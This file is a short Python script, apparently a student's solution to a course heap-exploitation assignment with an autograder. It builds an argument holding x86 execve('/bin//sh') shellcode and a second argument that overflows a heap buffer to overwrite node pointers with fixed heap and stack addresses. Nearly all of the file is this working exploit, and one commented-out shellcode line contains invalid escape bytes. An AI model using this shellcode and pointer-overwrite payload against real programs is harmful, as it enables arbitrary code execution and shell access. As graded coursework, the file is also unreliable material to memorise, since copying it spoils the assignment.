#!/usr/bin/env python3

import sys
#from shellcode import shellcode
from struct import pack

# You MUST fill in the values of the a, b, and c node pointers below. When you
# use heap addresses in your main solution, you MUST use these values or
# offsets from these values. If you do not correctly fill in these values and use
# them in your solution, the autograder may be unable to correctly grade your
# solution.

# IMPORTANT NOTE: When you pass your 3 inputs to your program, they are stored
# in memory inside of argv, but these addresses will be different then the
# addresses of these 3 nodes on the heap. Ensure you are using the heap
# addresses here, and not the addresses of the 3 arguments inside argv.

node_a = 0x080dd300
node_b = 0x080dd330
node_c = 0x080dd360

# Example usage of node address with offset -- Feel free to ignore
a_plus_4 = pack("<I", node_a + 4)

# Your code here

# new_shellcode = (b"\x90\x90\xJM\xJM\x11\x11\x11\x11\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80")

arg1 = b"\x90\x90\xeb\x04\x11\x11\x11\x11\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"

arg2 = b'\x11'*(32 + 8) + b'\x08\xd3\x0d\x08' + b'\x54\xcb\xfe\xff'

sys.stdout.buffer.write(arg1 + b' ' + arg2 + b' ' +  b'arg3')